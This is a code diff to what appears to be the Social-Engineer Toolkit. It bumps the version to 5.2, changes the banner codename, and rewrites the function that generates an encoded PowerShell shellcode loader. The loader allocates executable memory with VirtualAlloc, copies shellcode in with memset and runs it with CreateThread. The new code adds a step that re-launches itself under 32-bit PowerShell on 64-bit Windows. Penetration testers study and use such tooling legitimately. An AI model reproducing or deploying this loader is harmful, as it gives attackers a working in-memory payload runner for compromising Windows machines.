@@ -229,7 +229,7 @@ def print_error(message):
     print bcolors.RED + bcolors.BOLD + "[!] " + bcolors.ENDC + bcolors.RED + str(message) + bcolors.ENDC
 
 def get_version():
-    define_version = '5.1'
+    define_version = '5.2'
     return define_version
 
 class create_menu:
@@ -792,7 +792,7 @@ def show_banner(define_version,graphic):
 [---]        The Social-Engineer Toolkit ("""+bcolors.YELLOW+"""SET"""+bcolors.BLUE+""")         [---]
 [---]        Created by:""" + bcolors.RED+""" David Kennedy """+bcolors.BLUE+"""("""+bcolors.YELLOW+"""ReL1K"""+bcolors.BLUE+""")         [---]
 [---]                 Version: """+bcolors.RED+"""%s""" % (define_version) +bcolors.BLUE+"""                     [---]
-[---]          Codename: '""" + bcolors.YELLOW + """Name of the Doctor""" + bcolors.BLUE + """'          [---]
+[---]            Codename: '""" + bcolors.YELLOW + """Urban Camping""" + bcolors.BLUE + """'             [---]
 [---]        Follow us on Twitter: """ + bcolors.PURPLE+ """@trustedsec""" + bcolors.BLUE+"""         [---]
 [---]        Follow me on Twitter: """ + bcolors.PURPLE+ """@dave_rel1k""" + bcolors.BLUE+"""         [---]
 [---]       Homepage: """ + bcolors.YELLOW + """https://www.trustedsec.com""" + bcolors.BLUE+"""       [---]
@@ -1221,9 +1221,10 @@ def generate_powershell_alphanumeric_payload(payload,ipaddr,port, payload2):
     # heres our shellcode prepped and ready to go
     shellcode = newdata[:-1]
 
-    # powershell command here, needs to be unicoded then base64 in order to use encodedcommand
-    powershell_command = ('''$code = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = %s;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };''' % (shellcode))
+    # powershell command here, needs to be unicoded then base64 in order to use encodedcommand - this incorporates a new process downgrade attack where if it detects 64 bit it'll use x86 powershell. This is useful so we don't have to guess if its x64 or x86 and what type of shellcode to use
+    powershell_command = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = %s;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$goat = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";$cmd = "-noninteractive -EncodedCommand";iex "& $x86 $cmd $goat"}else{$cmd = "-noninteractive -EncodedCommand";iex "& powershell $cmd $goat";}""" %  (shellcode))	
 
+    # unicode and base64 encode and return it
     return base64.b64encode(powershell_command.encode('utf_16_le'))
 
 # generate base shellcode
@@ -1544,6 +1545,7 @@ def get_sql_port(host):
 
         sql_port = d[0].split(";")[9]
         return sql_port
+
     except:
         pass
 
